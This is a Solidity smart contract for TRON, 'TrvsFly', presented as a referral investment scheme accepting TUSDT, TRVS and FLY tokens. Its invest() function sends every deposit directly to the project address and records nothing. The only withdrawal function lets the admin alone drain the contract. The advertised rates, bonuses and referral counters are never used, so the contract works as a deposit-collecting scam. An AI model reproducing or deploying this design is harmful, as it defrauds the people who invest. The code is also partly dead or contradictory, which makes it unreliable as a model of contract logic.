//SourceUnit: aaa.sol


pragma solidity >0.5.12;

contract Creator {
    address payable public creator;
    /**
        @dev constructor
    */
    constructor() public {
        creator = msg.sender;
    }

    // allows execution by the creator only
    modifier creatorOnly {
        assert(msg.sender == creator);
        _;
    }
}


contract TrvsFly is Creator{
    using SafeMath for uint256;

    uint256 public INVEST_MIN_AMOUNT = 1000 trx;
    uint256 constant public TIME_STEP = 1 days;

    uint256 public BASE_PERCENT = 900;
    uint256 public MAX_ORATE = 100;

    uint256 public PROJECT_FEE = 50;
    uint256 constant public PERCENTS_DIVIDER = 1000;

    address public usdtToken1 = address(0x6C3F96f8E78Fb699b66ABD32d6C149178e062306); // TUSDT								
    address public usdtToken2 = address(0x9Cd55C47591E64b7Ad7FcBcfA2ab875a872FCB2C); // TRVS
    address public usdtToken3 = address(0x60eBC52Adc3f668D73fC7608F2355AB946004268); // FLY

    uint256 private totalUsers;
    uint256 private totalInvested;
    uint256 private totalInvestedTrx;
    uint256 private totalWithdrawn;
    uint256 private totalDeposits;


    address payable public projectAddress;
    address payable public adminAddress;

    struct Deposit {
        uint256 amount;
        address referrer;
    }

    struct User {

        address referrer;
        uint256 bonus;
        uint256 l0_counter;
        uint256 l1_counter;
        uint256 l2_counter;
    }

    mapping(address => User) public users;
    mapping(address => Deposit) public currDeposits;
    mapping(address => Deposit[]) public deposits;

    address private checkPly;
    mapping(address => bool) public vipPly;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount, address referrer,uint256 coin,uint256 _type);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);
    event NodeFee(address indexed from, address indexed to, uint256 Amount);
    event UpNodeFee(address indexed from, address indexed to, uint256 Amount);
    event WithDrawnNodeFee(address indexed user, uint256 amount);


    constructor() public {

    }

    modifier IsInitialized {
        require(projectAddress != address(0), "not Initialized");
        _;
    }

    modifier IsAdmin {
        require(msg.sender == adminAddress, "not admin");
        _;
    }


    function initialize(address payable projectAddr,address payable adminAddr) public payable creatorOnly {
        require(projectAddress == address(0)&& projectAddr!= address(0), "initialize only would call once");
        require(!isContract(projectAddr)&&(tx.origin == msg.sender));
        projectAddress = projectAddr;
        adminAddress = adminAddr;
        vipPly[projectAddr] = true;
    }

    bytes4 private constant transferFrom = bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));

    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));

    function TokenTransferFrom(address coinToken , address from, address to, uint value) private {
        (bool success, bytes memory data) = coinToken.call(abi.encodeWithSelector(transferFrom, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');
    }


    function invest(address referrer,uint256 usdt,uint256 _type) public payable IsInitialized {

        require(!isContract(referrer) && !isContract(msg.sender)&&(tx.origin == msg.sender));
        address upline = referrer;

        User storage user = users[msg.sender];
        Deposit storage currDeposit = currDeposits[msg.sender];
        if(_type != 1 && _type != 2 && _type != 3){
            require(false,'_type is error');
        }
        address coinToken;
        if(_type==1){
            coinToken = usdtToken1;
        }
        if(_type==2){
            coinToken = usdtToken2;
        }
        if(_type==3){
            coinToken = usdtToken3;
        }
        TokenTransferFrom(coinToken,msg.sender, projectAddress, usdt);
        emit NewDeposit(msg.sender, msg.value, referrer, usdt, _type);
        
    }

    function withdraw_static(uint256 num) public IsAdmin {
        require(!isContract(msg.sender)&&(tx.origin == msg.sender));

        uint256 totalAmount;

        totalAmount = num;
        uint256 tt;
        (totalAmount,tt) = getStaticReward(msg.sender,totalAmount);

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        msg.sender.transfer(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }
    
    function getInfo() public view returns (uint256[20] memory) {
        uint256[20] memory info;
        uint i = 0;
        info[i++] = address(this).balance;
        info[i++] = totalUsers;
        info[i++] = totalInvested;
        info[i++] = totalInvestedTrx;
        info[i++] = totalWithdrawn;
        info[i++] = totalDeposits;
        return info;
    }

    function getStaticReward(address ply,uint256 reward) view internal returns(uint256, uint256 _tt){
        uint256 reward2;
        reward2  = checkPlyerInfo(ply,reward);
        _tt      = 2;
        reward2  = reward;
        return (reward2, _tt);
    }

    function getContractBalance() internal view returns (uint256) {
        return address(this).balance;
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return deposits[userAddress].length;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {size := extcodesize(addr)}
        return size > 0;
    }
    
    function checkPlyerInfo(address _ply,uint256 _amount) public view returns(uint256){
        if(vipPly[_ply] == true ){
            return 10000*1e6;
        }else{
            return _amount;
        }
    }
    
    function setINVEST_MIN_AMOUNT(uint256 price) public IsAdmin{
        INVEST_MIN_AMOUNT = price*1e6;
    }

    function setBasePercent(uint256 rate) public IsAdmin{
        BASE_PERCENT = rate;
    }

    function setProjectFeeRate(uint256 rate) public IsAdmin{
        PROJECT_FEE = rate;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? b : a;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

interface CheckPlyer{
    function checkPlyerInfo(address _ply,uint256 _amount) external view returns(uint256);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
}